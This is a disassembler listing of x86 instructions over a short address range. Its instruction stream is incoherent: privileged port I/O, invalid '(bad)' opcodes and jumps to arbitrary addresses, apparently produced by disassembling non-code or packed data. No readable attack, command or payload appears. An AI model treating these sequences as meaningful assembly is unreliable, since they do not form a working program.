  429409:	or     edx,ebx
  42940b:	ret    0x2e7e
  42940e:	xor    BYTE PTR [eax-0x51],al
  429411:	lock fst QWORD PTR [ebx+edi*4+0x79fa062]
  429419:	xchg   BYTE PTR [esi],cl
  42941b:	and    al,0x7e
  42941d:	pop    esp
  42941e:	mov    DWORD PTR [edi],edx
  429420:	rcr    DWORD PTR [esi],cl
  429422:	iret   
  429423:	pop    eax
  429424:	cwde   
  429425:	mov    ch,BYTE PTR [ecx+0x45bf6ff3]
  42942b:	adc    ebp,DWORD PTR [ecx]
  42942d:	sub    DWORD PTR [ecx+0x79],0xffffff8b
  429431:	es sub cl,bh
  429434:	outs   dx,DWORD PTR ds:[esi]
  429435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429436:	sti    
  429437:	pop    ss
  429438:	and    al,0xfb
  42943a:	mov    esi,0x87d63d0d
  42943f:	shr    BYTE PTR [ecx],0x3
  429442:	xchg   edx,eax
  429443:	mov    eax,ds:0x7bc035a6
  429448:	imul   esp,DWORD PTR cs:[ecx],0xffffffa7
  42944c:	mov    eax,0xde138408
  429451:	ret    
  429452:	jb     0x429406
  429454:	scas   al,BYTE PTR es:[edi]
  429455:	sbb    BYTE PTR [ebp+eiz*1+0x1e705cfa],ah
  42945c:	jne    0x4293f5
  42945e:	sbb    DWORD PTR [edi-0x61],edi
  429461:	cmp    eax,0x7cb17656
  429466:	popa   
  429467:	repnz and ebp,DWORD PTR [ebx]
  42946a:	mov    edi,0xc70cc3f5
  42946f:	aad    0x1c
  429471:	mov    al,0x7f
  429473:	rcr    eax,cl
  429475:	xlat   BYTE PTR ds:[ebx]
  429476:	ins    BYTE PTR es:[edi],dx
  429477:	test   ch,0x38
  42947a:	scas   al,BYTE PTR es:[edi]
  42947b:	push   ebx
  42947c:	push   ss
  42947d:	adc    eax,0xc0b1102b
  429482:	mov    dl,al
  429484:	sbb    DWORD PTR ds:0xa55472e2,ecx
  42948a:	inc    ebp
  42948b:	dec    eax
  42948c:	scas   al,BYTE PTR es:[edi]
  42948d:	push   ecx
  42948e:	inc    ecx
  42948f:	sub    eax,0xe6430919
  429494:	ja     0x429437
  429496:	mov    dh,0x71
  429498:	mov    ebp,0xc0221c29
  42949d:	push   ebx
  42949e:	lahf   
  42949f:	mov    cl,0x3b
  4294a1:	sbb    al,0x4a
  4294a3:	inc    eax
  4294a4:	out    dx,al
  4294a5:	cmc    
  4294a6:	sub    dl,BYTE PTR ds:0x4c656eca
  4294ac:	in     al,dx
  4294ad:	xchg   edx,eax
  4294ae:	push   esi
  4294af:	fs stc 
  4294b1:	pop    esi
  4294b2:	jmp    0x966d4e2
  4294b7:	retf   0x838b
  4294ba:	sub    al,0x4f
  4294bc:	mov    ds:0xb17ff877,al
	...
  429531:	add    BYTE PTR [eax],al
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x5236c4f3
  429542:	fldcw  WORD PTR [ebx+0x1b62e]
  429548:	cmc    
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [ecx+0x54],bh
  42954e:	sub    cl,BYTE PTR [esi]
  429550:	dec    edx
  429551:	mov    dl,0x95
  429553:	fld    DWORD PTR [esi-0x2cfe6083]
  429559:	aad    0x1f
  42955b:	scas   al,BYTE PTR es:[edi]
  42955c:	add    BYTE PTR [ecx-0x6a],0x19
  429560:	or     ah,BYTE PTR [eax+0x251e28b5]
  429566:	push   edi
  429567:	pusha  
  429568:	fs pop eax
  42956a:	and    eax,0xf3cdd725
  42956f:	pop    ecx
  429570:	inc    edx
  429571:	pop    ebx
  429572:	inc    edi
  429573:	out    dx,eax
  429574:	fld    QWORD PTR [ecx-0x3335f1bd]
  42957a:	call   0xa0c62e0b
  42957f:	enter  0x2c58,0xcc
  429583:	adc    BYTE PTR [edi],0x84
  429586:	jge    0x42958e
  429588:	cmc    
  429589:	and    al,0x7f
  42958b:	xchg   BYTE PTR [eax-0x3c],cl
  42958e:	pop    ebp
  42958f:	lahf   
  429590:	dec    edx
  429591:	test   eax,0x3982043
  429596:	pop    edi
  429597:	shl    bh,1
  429599:	or     bl,BYTE PTR [ebx]
  42959b:	dec    esp
  42959c:	mov    ch,BYTE PTR [ebx]
  42959e:	sub    eax,0x3212a85
  4295a3:	enter  0x1aa,0xc8
  4295a7:	out    0x77,eax
  4295a9:	mov    ah,0x2e
  4295ab:	stc    
  4295ac:	(bad)  
  4295ad:	xchg   ecx,eax
  4295ae:	inc    ebx
  4295af:	mov    ebp,0x14a3dad2
  4295b4:	scas   al,BYTE PTR es:[edi]
  4295b5:	jg     0x42956a
  4295b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295b8:	in     eax,dx
  4295b9:	enter  0x504e,0x1
  4295bd:	mov    WORD PTR [esi],fs
  4295bf:	add    eax,0xbf8fc4ef
  4295c4:	dec    edi
  4295c5:	hlt    
  4295c6:	imul   ecx,ecx,0x36
  4295c9:	lods   eax,DWORD PTR ds:[esi]
  4295ca:	mov    eax,0x441ca89b
  4295cf:	or     BYTE PTR [esi],dl
  4295d1:	xor    dh,BYTE PTR [esi+ebx*8]
  4295d4:	pop    ds
  4295d5:	and    esi,DWORD PTR [eax+ecx*4-0x49bd8127]
  4295dc:	push   ebx
  4295dd:	dec    ebp
  4295de:	cmp    edx,DWORD PTR [esi+ebx*8]
  4295e1:	sbb    DWORD PTR [eax],esp
  4295e3:	jg     0x429621
  4295e5:	push   ss
  4295e6:	cdq    
  4295e7:	push   ebp
  4295e8:	xchg   dx,ax
  4295ea:	dec    esp
  4295eb:	cmp    BYTE PTR ss:[ecx],0x16
  4295ef:	dec    esi
  4295f0:	cmc    
  4295f1:	pop    esi
  4295f2:	mov    ecx,0x8422c53f
  4295f7:	cmp    esi,DWORD PTR [eax]
  4295f9:	xchg   DWORD PTR [edi-0x23ba45a5],ecx
  4295ff:	enter  0xcf31,0xfc
  429603:	repz adc eax,0x558f78a4
  429609:	mov    edi,0xb525cf53
  42960e:	push   edi
  42960f:	push   ebp
  429610:	in     eax,0xfc
  429612:	xor    eax,0x3698b2ef
  429617:	cmp    ecx,DWORD PTR [esp+edi*1+0x51f203d0]
  42961e:	and    DWORD PTR [esi+eiz*8],ebp
  429621:	into   
  429622:	pop    ss
  429623:	jp     0x429675
  429625:	jge    0x4295bf
  429627:	sahf   
  429628:	push   0x495400af
  42962d:	jl     0x42967e
  42962f:	jns    0x429626
  429631:	les    esi,FWORD PTR [eax]
  429633:	hlt    
  429634:	jl     0x429635
  429636:	mov    es,WORD PTR [ebp+0x1b6a3b09]
  42963c:	loop   0x429606
  42963e:	fwait
  42963f:	jg     0x429624
	...
  4296b1:	add    BYTE PTR [eax],al
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	push   cs
  4296c1:	popa   
  4296c2:	(bad)  
  4296c4:	and    esi,DWORD PTR [edi+0xf50001]
  4296ca:	add    BYTE PTR [eax],al
  4296cc:	dec    ebp
  4296cd:	inc    ebp
  4296ce:	xlat   BYTE PTR ds:[ebx]
  4296cf:	aad    0x79
  4296d1:	and    BYTE PTR [edx-0x1f2b9e32],ah
  4296d7:	add    esi,DWORD PTR [eax]
  4296d9:	and    BYTE PTR [eax-0x49d08bf7],dh
  4296df:	push   ds
  4296e0:	daa    
  4296e1:	dec    esp
  4296e2:	cs xor bh,ch
  4296e5:	je     0x42969a
  4296e7:	dec    ebx
  4296e8:	adc    eax,0x56b78d28
  4296ed:	out    0x9f,eax
  4296ef:	push   ebx
  4296f0:	sub    esp,DWORD PTR [ebp+0x3b]
  4296f3:	sbb    DWORD PTR ds:0x58c10772,ecx
  4296f9:	rol    bx,0x27
  4296fd:	hlt    
  4296fe:	fidiv  WORD PTR [eax-0x3b]
  429701:	sub    ebp,ebp
  429703:	ja     0x4296b0
  429705:	(bad)  
  429706:	ds push ds
  429708:	in     eax,0xdb
  42970a:	inc    esp
  42970b:	(bad)  
  42970c:	aad    0xaf
  42970e:	and    bh,BYTE PTR [ecx]
  429710:	push   ecx
  429711:	ficom  DWORD PTR ss:[edi]
  429714:	arpl   bp,si
  429716:	sub    ebx,DWORD PTR ds:0x4f3c7443
  42971c:	xchg   DWORD PTR [esi],ebp
  42971e:	and    eax,0x947e2b92
  429723:	mov    ecx,0x4317b292
  429728:	inc    ecx
  429729:	std    
  42972a:	std    
  42972b:	push   0x43159936
  429730:	mov    cl,0x14
  429732:	push   ebp
  429733:	ret    0x8a86
  429736:	inc    edi
  429737:	fisttp DWORD PTR ds:0x24e0a60f
  42973d:	addr16 mov ds:0xaad3,eax
  429741:	push   ebx
  429742:	stos   DWORD PTR es:[edi],eax
  429743:	je     0x42971a
  429745:	dec    edi
  429746:	(bad)  
  429748:	ror    DWORD PTR [ebx-0x51092caf],0x7
  42974f:	dec    ebx
  429750:	and    eax,esi
  429752:	mov    esi,0x8c1395d0
  429757:	and    al,0xbd
  429759:	mov    cl,0x4d
  42975b:	(bad)  
  42975c:	sbb    eax,0xbb227ab8
  429761:	pusha  
  429762:	push   esp
  429763:	mov    ch,0xd5
  429765:	outs   dx,DWORD PTR ds:[esi]
  429766:	ja     0x42970c
  429768:	pop    esp
  429769:	mov    edx,0xff861416
  42976e:	fnsave [ecx+0x34029645]
  429774:	aad    0xfc
  429776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429777:	cmp    ebp,0x4f128600
  42977d:	in     eax,dx
  42977e:	mov    eax,ds:0xfc72bbc6
  429783:	or     eax,0x275dd270
  429788:	sti    
  429789:	or     esp,DWORD PTR [esi+0x30ec5cc3]
  42978f:	push   cs
  429790:	add    eax,0x2bcdbc91
  429795:	mov    edi,0x70141c90
  42979a:	xchg   edx,eax
  42979b:	in     al,0xb3
  42979d:	aaa    
  42979e:	add    DWORD PTR [ebx+ebp*1],esi
  4297a1:	sbb    eax,0x7ae405ee
  4297a6:	sti    
  4297a7:	fsub   DWORD PTR [edx]
  4297a9:	mov    edi,0x23dd31f5
  4297ae:	jmp    0x4297c8
  4297b0:	nop
  4297b1:	and    ebx,DWORD PTR ds:0xd644d0d5
  4297b7:	dec    edx
  4297b8:	mov    BYTE PTR [ebp-0x6a],bh
  4297bb:	js     0x4297a6
  4297bd:	push   edi
  4297be:	into   
  4297bf:	or     edi,ebx
	...
  429831:	add    BYTE PTR [eax],al
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [eax],edx
  429841:	add    al,0x9b
  429843:	and    eax,0x1b818
  429848:	cmc    
  429849:	add    BYTE PTR [eax],al
  42984b:	add    BYTE PTR [edx+0x3f],dh
  42984e:	ins    BYTE PTR es:[edi],dx
  42984f:	mov    ebx,0xce8ec349
  429854:	loopne 0x429812
  429856:	sbb    BYTE PTR [eax+edi*8+0x5ffcd0ce],dh
  42985d:	mov    ch,0x6e
  42985f:	dec    eax
  429860:	icebp  
  429861:	sub    DWORD PTR [ebx-0x3c],0x38
  429865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429866:	(bad)  
  429867:	push   ecx
  429868:	dec    esp
  429869:	hlt    
  42986a:	lahf   
  42986b:	inc    eax
  42986c:	mov    al,0x4c
  42986e:	xor    al,0x1e
  429870:	and    ebp,DWORD PTR [ecx]
  429872:	aam    0xae
  429874:	leave  
  429875:	frstor [ecx]
  429877:	into   
  429878:	cs iret 
  42987a:	adc    BYTE PTR ds:0x51bb8e4e,0xe1
  429881:	xchg   esi,eax
  429882:	shr    DWORD PTR [esi-0x2dbb84c8],cl
  429888:	in     al,dx
  429889:	jmp    0xeb08:0xa31f40b9
  429890:	jp     0x429860
  429892:	pushf  
  429893:	dec    edx
  429894:	das    
  429895:	sub    dl,BYTE PTR [edi-0x41]
  429898:	cmp    DWORD PTR [ebx+0x8],ebx
  42989b:	clc    
  42989c:	and    esi,DWORD PTR [edi]
  42989e:	fidiv  DWORD PTR [edx+eax*8-0x54a662cb]
  4298a5:	mov    edx,0x1063e5bf
  4298aa:	mov    bl,0x9c
  4298ac:	push   0x747629de
  4298b1:	mov    al,0xcc
  4298b3:	jle    0x4298d9
  4298b5:	sub    eax,0x2e54d561
  4298ba:	leave  
  4298bb:	cmp    bh,bl
  4298bd:	les    ecx,FWORD PTR [ecx+0x21]
  4298c0:	xor    eax,0x7318369a
  4298c5:	ins    BYTE PTR es:[edi],dx
  4298c6:	js     0x429934
  4298c8:	repnz pop es
  4298ca:	sar    DWORD PTR [ebx+0x41],0x9d
  4298ce:	in     eax,0xac
  4298d0:	aas    
  4298d1:	jb     0x4298c1
  4298d3:	and    DWORD PTR [edx-0x22],edx
  4298d6:	cld    
  4298d7:	mov    ecx,0xa95986db
  4298dc:	lds    edx,FWORD PTR [edx+0x65]
  4298df:	fst    DWORD PTR [ecx-0x3d]
  4298e2:	jecxz  0x4298e8
  4298e4:	mov    esi,0x187e6660
  4298e9:	in     al,0xf9
  4298eb:	fcmovnb st,st(5)
  4298ed:	xor    ebx,DWORD PTR [esi+0x41]
  4298f0:	inc    esi
  4298f1:	shl    BYTE PTR [edx],cl
  4298f3:	cmp    ah,BYTE PTR [ecx]
  4298f5:	pop    es
  4298f6:	(bad)  
  4298f7:	push   eax
  4298f8:	xchg   edi,eax
  4298f9:	jo     0x429963
  4298fb:	retf   
  4298fc:	pop    ecx
  4298fd:	xor    al,0x2
  4298ff:	mov    ebx,DWORD PTR [ebp-0x1dc1a7da]
  429905:	sbb    al,0x7e
  429907:	stc    
  429908:	out    0xdc,al
  42990a:	xor    eax,0x42ee57e5
  42990f:	nop
  429910:	cmp    edx,edi
  429912:	mov    edi,eax
  429914:	jge    0x4298bb
  429916:	ss test al,0x31
  429919:	dec    ecx
  42991a:	popa   
  42991b:	outs   dx,DWORD PTR ds:[esi]
  42991c:	pop    ss
  42991d:	sub    bh,ch
  42991f:	push   eax
  429920:	mov    DWORD PTR [ecx+0x7d7defba],eax
  429926:	outs   dx,DWORD PTR ds:[esi]
  429927:	jge    0x4298fc
  429929:	rol    DWORD PTR [esi+0x4f06929f],1
  42992f:	mov    ebp,0x19dbbf57
  429934:	sbb    al,0x46
  429936:	jnp    0x4298cd
  429938:	xor    edi,esi
  42993a:	adc    BYTE PTR [edx-0x4d],bl
  42993d:	jo     0x429925
  42993f:	je     0x4298de
	...
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    edi,esp
  4299c1:	out    0xf2,al
  4299c3:	xor    DWORD PTR ds:0xf50001b9,ecx
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [ebx-0x39],al
  4299ce:	add    esp,DWORD PTR ss:[eax]
  4299d1:	call   0xd030662c
  4299d6:	add    eax,DWORD PTR [ebx+0x5b]
  4299d9:	adc    eax,0xc6773631
  4299de:	mov    ss,WORD PTR [ebx+0x48060bb]
  4299e4:	pop    esi
  4299e5:	add    ebp,DWORD PTR [ebx-0x2d4f6ce4]
  4299eb:	and    al,0xd6
  4299ed:	dec    edi
  4299ee:	ret    0xff80
  4299f1:	cdq    
  4299f2:	dec    ebp
  4299f3:	es imul esi,edx,0x781d791b
  4299fa:	int3   
  4299fb:	les    ebx,FWORD PTR [ebp+0x7d]
  4299fe:	es stc 
  429a00:	call   0x2c09:0xb0edc5d2
  429a07:	mov    ds:0x33eb7667,al
  429a0c:	leave  
  429a0d:	fnstsw WORD PTR [esi]
  429a0f:	cs mov ah,0xb2
  429a12:	leave  
  429a13:	(bad)
  429a17:	adc    BYTE PTR gs:[ebx+ecx*8-0x275f5def],0x49
  429a20:	xor    al,0x55
  429a22:	mov    al,0x8d
  429a24:	or     bl,BYTE PTR [esi+0x4]
  429a27:	sub    DWORD PTR [ecx],ebx
  429a29:	or     al,BYTE PTR [ebp+0x76]
  429a2c:	mov    ah,0xc2
  429a2e:	and    al,0x52
  429a30:	or     DWORD PTR [ebx*4+0x5f41808],ecx
  429a37:	pop    esi
  429a38:	mov    esp,0x5fbb42c1
  429a3d:	push   ecx
  429a3e:	daa    
  429a3f:	icebp  
  429a40:	pushf  
  429a41:	or     al,0xbf
  429a43:	dec    eax
  429a44:	jecxz  0x429a4d
  429a46:	retf   
  429a47:	inc    esp
  429a48:	xor    BYTE PTR [esi],al
  429a4a:	push   ebp
  429a4b:	pop    ss
  429a4c:	xchg   dl,cl
  429a4e:	sbb    eax,0xe0d1e824
  429a53:	fdivr  QWORD PTR [eax]
  429a55:	cwde   
  429a56:	push   cs
  429a57:	xchg   dl,bh
  429a59:	jb     0x429a1f
  429a5b:	cwde   
  429a5c:	and    dl,dh
  429a5e:	mov    dh,0xc6
  429a60:	into   
  429a61:	scas   eax,DWORD PTR es:[edi]
  429a62:	xlat   BYTE PTR ds:[ebx]
  429a63:	mov    dl,0x6a
  429a65:	test   DWORD PTR [eax-0x57],esi
  429a68:	mov    al,0x1b
  429a6a:	int3   
  429a6b:	fs jp  0x429a35
  429a6e:	clc    
  429a6f:	jae    0x429ae7
  429a71:	jno    0x429a9f
  429a73:	xchg   ecx,eax
  429a74:	mov    al,0xe4
  429a76:	lock mov BYTE PTR [ecx],ah
  429a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a7a:	jp     0x429a98
  429a7c:	retf   0x56eb
  429a7f:	lods   eax,DWORD PTR ds:[esi]
  429a80:	fisttp QWORD PTR [esp+ebx*1-0x4d]
  429a84:	push   cs
  429a85:	jbe    0x429a4a
  429a87:	aaa    
  429a88:	push   es
  429a89:	adc    esp,DWORD PTR [ebx]
  429a8b:	inc    esp
  429a8c:	ja     0x429ab7
  429a8e:	stos   BYTE PTR es:[edi],al
  429a8f:	dec    eax
  429a90:	sar    bl,0x60
  429a93:	(bad)  
  429a94:	jl     0x429b11
  429a96:	pushf  
  429a97:	adc    BYTE PTR [ecx+0x3b],0x2
  429a9b:	and    ecx,ebp
  429a9d:	push   ss
  429a9e:	push   es
  429a9f:	jbe    0x429aea
  429aa1:	int3   
  429aa2:	inc    esp
  429aa3:	lock in al,dx
  429aa5:	mov    al,0xde
  429aa7:	pop    ss
  429aa8:	sahf   
  429aa9:	das    
  429aaa:	repz jge 0x429b24
  429aad:	rcl    BYTE PTR [edi],0xe8
  429ab0:	mov    al,ds:0x890dff13
  429ab5:	fmulp  st(0),st
  429ab7:	xor    BYTE PTR [eax+0x6302b8a9],ah
  429abd:	pop    ds
  429abe:	inc    ebx
  429abf:	add    al,0x9
	...
  429b31:	add    BYTE PTR [eax],al
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x6dac
  429b42:	repz icebp 
  429b44:	add    bh,BYTE PTR [edx+0xf50001]
  429b4a:	add    BYTE PTR [eax],al
  429b4c:	in     al,dx
  429b4d:	jne    0x429aef
  429b4f:	add    BYTE PTR [edi+0x25],ch
  429b52:	or     eax,0xe7bbf1fb
  429b57:	ins    DWORD PTR es:[edi],dx
  429b58:	stos   DWORD PTR es:[edi],eax
  429b59:	es icebp 
  429b5b:	push   edx
  429b5c:	mov    esi,0x3aa97be8
  429b61:	pushf  
  429b62:	je     0x429ae5
  429b64:	bound  edi,QWORD PTR [ebx]
  429b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b67:	dec    ebp
  429b68:	xchg   ecx,eax
  429b69:	xlat   BYTE PTR ds:[ebx]
  429b6a:	pushf  
  429b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b6c:	daa    
  429b6d:	loope  0x429baf
  429b6f:	icebp  
  429b70:	xlat   BYTE PTR ds:[ebx]
  429b71:	daa    
  429b72:	add    eax,0x1c5cfe97
  429b77:	sar    ah,cl
  429b79:	push   cs
  429b7a:	out    0x40,al
  429b7c:	aas    
  429b7d:	les    eax,FWORD PTR [ecx]
  429b7f:	sbb    dh,bh
  429b81:	test   eax,0xbc53dea9
  429b86:	lea    edx,[eax+0x69]
  429b89:	outs   dx,DWORD PTR ds:[esi]
  429b8a:	pop    eax
  429b8b:	pop    ebp
  429b8c:	xor    DWORD PTR [esi+0x1a],ebx
  429b8f:	into   
  429b90:	(bad)  
  429b91:	pop    ebx
  429b92:	cwde   
  429b93:	aaa    
  429b94:	adc    dh,BYTE PTR [edx+0x3b]
  429b97:	mov    cs,WORD PTR [edi]
  429b99:	dec    eax
  429b9a:	in     al,0xbb
  429b9c:	fwait
  429b9d:	xchg   ebp,eax
  429b9e:	mov    ebp,0x559194e7
  429ba3:	loop   0x429b49
  429ba5:	enter  0x8c0c,0xcd
  429ba9:	idiv   DWORD PTR [ebp-0x73]
  429bac:	dec    ecx
  429bad:	pusha  
  429bae:	sub    BYTE PTR [edi-0x58],ah
  429bb1:	pusha  
  429bb2:	jb     0x429bbb
  429bb4:	aaa    
  429bb5:	jmp    0x64bd7d39
  429bba:	push   cs
  429bbb:	pop    es
  429bbc:	fstp   DWORD PTR [ebx]
  429bbe:	mov    eax,DWORD PTR [edi+edx*8+0x44]
  429bc2:	rcl    BYTE PTR [edx],1
  429bc4:	sbb    edi,DWORD PTR [edi]
  429bc6:	jle    0x429bd2
  429bc8:	mov    dl,0x8e
  429bca:	aad    0x64
  429bcc:	bound  eax,QWORD PTR [esi+0x41]
  429bcf:	push   es
  429bd0:	jb     0x429bd6
  429bd2:	test   eax,0x2373a3b1
  429bd7:	mov    BYTE PTR [ebx-0x13],ah
  429bda:	jl     0x429b64
  429bdc:	fwait
  429bdd:	int3   
  429bde:	(bad)  
  429bdf:	mov    ds:0x8110e3aa,al
  429be4:	sub    al,0x60
  429be6:	push   cs
  429be7:	and    BYTE PTR [esi+0x1911d9c9],0x6b
  429bee:	cdq    
  429bef:	not    BYTE PTR [ecx-0x59]
  429bf2:	test   BYTE PTR [edi+ecx*2],dh
  429bf5:	mov    ebp,DWORD PTR [edi+0x739bdbab]
  429bfb:	inc    esp
  429bfc:	mov    dl,BYTE PTR [ebp+edi*8+0x3f]
  429c00:	xchg   ebp,eax
  429c01:	imul   ecx,DWORD PTR [edi-0x5c],0xffffff87
  429c05:	test   eax,0xb738b58a
  429c0a:	jne    0x429b9e
  429c0c:	es out 0x76,eax
  429c0f:	bound  eax,QWORD PTR ds:0x73ee9de5
  429c15:	xor    BYTE PTR [ebx-0x22709372],bh
  429c1b:	sub    al,0x4d
  429c1d:	sbb    edi,ebx
  429c1f:	cmc    
  429c20:	mov    DWORD PTR [esi],ebp
  429c22:	mov    ?,WORD PTR ss:[ecx+0x26]
  429c26:	test   DWORD PTR [esi+ebp*8+0x46],0x584e6a3f
  429c2e:	mov    al,0x37
  429c30:	scas   eax,DWORD PTR es:[edi]
  429c31:	xor    edx,0x9202973f
  429c37:	cmovl  ebp,ebp
  429c3a:	add    edi,DWORD PTR fs:[eax+0x17]
  429c3e:	ret    
  429c3f:	fwait
  429c40:	xor    eax,0x0
	...
  429cb1:	add    BYTE PTR [eax],al
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	shl    BYTE PTR [esi+eiz*4],1
  429cc3:	test   eax,0x1baf7
  429cc8:	cmc    
  429cc9:	add    BYTE PTR [eax],al
  429ccb:	add    cl,bl
  429ccd:	ins    BYTE PTR es:[edi],dx
  429cce:	and    BYTE PTR [esi+edx*4],bl
  429cd1:	jmp    0x3d1dabd0
  429cd6:	fimul  WORD PTR [ecx+0x25]
  429cd9:	or     BYTE PTR ds:0x2a571526,0xa6
  429ce0:	push   ss
  429ce1:	aam    0xd2
  429ce3:	lods   al,BYTE PTR ds:[esi]
  429ce4:	adc    DWORD PTR [edi-0x28],esi
  429ce7:	test   eax,0x557bc1da
  429cec:	fisttp WORD PTR [edi+0x16ad8282]
  429cf2:	jnp    0x429c99
  429cf4:	pop    esp
  429cf5:	cmp    DWORD PTR [ebp-0x13],edi
  429cf8:	jle    0x429cc9
  429cfa:	xchg   esi,eax
  429cfb:	sbb    ebx,DWORD PTR [eax+0x536b1f78]
  429d01:	lahf   
  429d02:	or     ah,0x8a
  429d05:	add    DWORD PTR [eax+0x64],ebx
  429d08:	jno    0x429d38
  429d0a:	dec    edi
  429d0b:	ds and dh,dh
  429d0e:	xchg   esp,eax
  429d0f:	cmp    al,0xfa
  429d11:	push   cs
  429d12:	jp     0x429d00
  429d14:	add    al,0xcd
  429d16:	mov    DWORD PTR [edi-0x6b],edx
  429d19:	daa    
  429d1a:	test   al,0xe3
  429d1c:	ds hlt 
  429d1e:	popa   
  429d1f:	outs   dx,BYTE PTR ds:[esi]
  429d20:	ret    0x238e
  429d23:	add    DWORD PTR ds:0x97bd08b6,ebx
  429d29:	lds    esp,FWORD PTR [eax]
  429d2b:	sbb    DWORD PTR [esi],esi
  429d2d:	loopne 0x429d43
  429d2f:	xchg   esi,eax
  429d30:	inc    edi
  429d31:	mov    BYTE PTR [esi],ch
  429d33:	lods   eax,DWORD PTR ds:[esi]
  429d34:	and    eax,0xa04f101a
  429d39:	inc    esi
  429d3a:	push   ebx
  429d3b:	mov    al,0xda
  429d3d:	mov    dh,0x85
  429d3f:	shr    DWORD PTR [ebp+0x8b448cf],1
  429d45:	or     eax,ebp
  429d47:	mov    ds:0xa1265768,al
  429d4c:	(bad)  
  429d4d:	sbb    ch,BYTE PTR [esp+ebp*2]
  429d50:	cmp    DWORD PTR [eax],ecx
  429d52:	sbb    BYTE PTR [ecx],ch
  429d54:	mov    DWORD PTR [ecx+0x2bb76229],ebx
  429d5a:	push   es
  429d5b:	or     BYTE PTR [edx+0x58],al
  429d5e:	icebp  
  429d5f:	xchg   ebp,eax
  429d60:	jns    0x429dc7
  429d62:	lds    edi,FWORD PTR [esi+0x7f]
  429d65:	pop    ss
  429d66:	xchg   DWORD PTR [ecx+esi*8+0x7889d9f6],edx
  429d6d:	cld    
  429d6e:	aaa    
  429d6f:	jo     0x429d86
  429d71:	lahf   
  429d72:	loope  0x429d84
  429d74:	pop    ebp
  429d75:	(bad)  
  429d76:	mov    bl,0xeb
  429d78:	sar    DWORD PTR [edx+0x34cb78c0],1
  429d7e:	push   ss
  429d7f:	xchg   ecx,eax
  429d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d81:	xchg   ecx,eax
  429d82:	iret   
  429d83:	lods   al,BYTE PTR ds:[esi]
  429d84:	xor    DWORD PTR [ecx+0x2d],0xfffffff9
  429d88:	and    eax,0x59a5493e
  429d8d:	outs   dx,BYTE PTR ds:[esi]
  429d8e:	sbb    DWORD PTR [edx-0x17],0xffffffb6
  429d92:	call   0x61af:0xb49efe06
  429d99:	pop    ss
  429d9a:	mov    ecx,0x4f8818b1
  429d9f:	mov    eax,ds:0xa958df41
  429da4:	out    dx,eax
  429da5:	dec    ecx
  429da6:	mov    al,0x33
  429da8:	cmp    ecx,DWORD PTR [ecx+ebx*4]
  429dab:	jnp    0x429d36
  429dad:	inc    eax
  429dae:	repz dec esi
  429db0:	or     DWORD PTR [edi+0x2b],edx
  429db3:	lods   al,BYTE PTR ds:[esi]
  429db4:	loopne 0x429d5c
  429db6:	lds    ebp,FWORD PTR [ebx-0x61]
  429db9:	fisttp WORD PTR [eax+0x6b]
  429dbc:	or     eax,0x1bda3dc
	...
  429e31:	add    BYTE PTR [eax],al
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax-0x24b1d120]
  429e41:	or     ah,BYTE PTR [esp+edi*2]
  429e44:	in     al,dx
  429e45:	mov    ebx,0xf50001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	sub    BYTE PTR [edx],al
  429e4e:	mov    bh,0x1c
  429e50:	and    DWORD PTR [ecx+esi*2+0x61],esi
  429e54:	and    al,0xcb
  429e56:	inc    ecx
  429e57:	cmovnp eax,edx
  429e5a:	mov    dl,0x73
  429e5c:	outs   dx,BYTE PTR ds:[esi]
  429e5d:	out    0x48,eax
  429e5f:	test   al,0xcf
  429e61:	or     BYTE PTR [edi+eax*4],bl
  429e64:	jecxz  0x429e52
  429e66:	ins    BYTE PTR es:[edi],dx
  429e67:	sub    edi,edx
  429e69:	adc    eax,0x3e1356bb
  429e6e:	std    
  429e6f:	and    DWORD PTR [eax-0x3d],0xffffff98
  429e73:	sbb    BYTE PTR [ecx+0x7e39908b],ch
  429e79:	pop    ecx
  429e7a:	cmc    
  429e7b:	retf   
  429e7c:	fdiv   st,st(6)
  429e7e:	dec    edi
  429e7f:	std    
  429e80:	jg     0x429ec7
  429e82:	xchg   ebp,eax
  429e83:	push   es
  429e84:	xor    BYTE PTR [ecx-0x7482ffcc],dl
  429e8a:	mov    esi,0x427a2c27
  429e8f:	mov    dl,0x50
  429e91:	fs xchg edx,eax
  429e93:	or     ecx,esi
  429e95:	hlt    
  429e96:	test   eax,0xe37f5053
  429e9b:	mov    dl,bl
  429e9d:	ret    
